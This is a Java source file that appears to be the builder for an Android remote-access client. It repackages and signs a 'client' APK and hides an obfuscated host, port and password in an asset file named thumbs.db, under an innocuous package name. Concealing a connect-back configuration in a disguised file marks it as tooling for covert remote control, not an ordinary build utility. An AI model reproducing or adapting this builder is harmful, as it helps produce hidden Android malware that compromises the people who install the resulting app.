package com.android.security.utils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;

import org.apache.commons.codec.binary.Base64;


public class Generator {
	public static String generateApk() throws Exception {
		File buildFile = new File("build.xml");
		buildFile.delete();

		File clientDir = new File("client");
 
		String buildString = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
		buildString = buildString
				+ "<project name=\"tmp\" default=\"release\" basedir=\".\">";
		buildString = buildString
				+ "<zip destfile=\"tmp.apk\" duplicate=\"add\">";
		buildString = buildString + "<fileset dir=\"";
		buildString = buildString + clientDir.getAbsolutePath();
		buildString = buildString + "\"/>";
		buildString = buildString + "</zip>\n";
		buildString = buildString + "</project>";

		FileOutputStream out = null;
		boolean writed = false;
		try {
			out = new FileOutputStream(buildFile);
			out.write(buildString.getBytes("utf-8"));
			out.flush();
			writed = true;
		} catch (Exception localException) {
			throw   localException;
		}

		if (out != null) {
			try {
				out.close();
			} catch (IOException localIOException) {
			}
		}

		if (!writed) {
			throw new Exception("无法生成build文件");
		}

		File tmpFile = new File("tmp.apk");
		tmpFile.delete();
		String workDir = System.getProperty("user.dir");
		String cmd = "\"" + workDir + "/ant/bin/ant.bat\" -buildfile \"";
		cmd = cmd + buildFile.getAbsolutePath() + "\"";
		try {
			Process ps = Runtime.getRuntime().exec(cmd);
			try {
				ps.waitFor();
			} catch (InterruptedException localInterruptedException) {
			}
			ps.destroy();
		} catch (IOException localIOException1) {
			throw   localIOException1;
		}
		if (!tmpFile.exists()) {
			throw new Exception("无法生成apk文件");
		}

		File signedFile = new File("signed.apk");
		signedFile.delete();

		cmd = "\"" + workDir + "/dex2jar/d2j-apk-sign.bat\" -f -w -o \"";
		cmd = cmd + signedFile.getAbsolutePath() + "\" \""
				+ tmpFile.getAbsolutePath() + "\"";
		try {
			Process ps = Runtime.getRuntime().exec(cmd);
			try {
				ps.waitFor();
			} catch (InterruptedException localInterruptedException1) {
			}
			ps.destroy();
		} catch (IOException localIOException2) {
			throw   localIOException2;
		}

		if (!signedFile.exists()) {
			throw new Exception("无法签名apk文件");
		}
		File clientFile = new File("client.apk");
		clientFile.delete();
		cmd = "\"" + workDir + "/ant/zipalign.exe\" -f 4 \"";
		cmd = cmd + signedFile.getAbsolutePath() + "\" \""
				+ clientFile.getAbsolutePath() + "\"";
		try {
			Process ps = Runtime.getRuntime().exec(cmd);
			try {
				ps.waitFor();
			} catch (InterruptedException localInterruptedException2) {
			}
			ps.destroy();
		} catch (IOException localIOException3) {
			throw   localIOException3;
		}
		if (!clientFile.exists()) {
			throw new Exception("无法优化apk文件");
		}
		buildFile.delete();
		tmpFile.delete();
		signedFile.delete();
		return clientFile.getAbsolutePath();
	}

	public static boolean generateConfig(String host, String port,
			String password) {
		boolean result = false;
		String config = host + " " + port + " " + password;
		byte[] buf = null;
		try {
			buf = config.getBytes("utf-8");
		} catch (UnsupportedEncodingException e) {
			return result;
		}

		byte[] buf1 = new byte[buf.length];
		for (int i = 0; i < buf.length; i++) {
			buf1[i] = (byte) (buf[i] - 1);
		}
		byte[] buf2 = Base64.encodeBase64(buf1);
		byte[] buf3 = new byte[buf2.length];
		for (int i = 0; i < buf2.length; i++) {
			buf3[i] = (byte) (buf2[i] - 1);
		}
		
		File configFile = new File("client/assets/thumbs.db");
		FileOutputStream out = null;
		try {
			out = new FileOutputStream(configFile);
			out.write(buf3);
			out.flush();
			result = true;
		} catch (IOException e) {
			result = false;
		}
		if (out != null) {
			try {
				out.close();
			} catch (IOException localIOException1) {
			}
		}
		return result;
	}
}
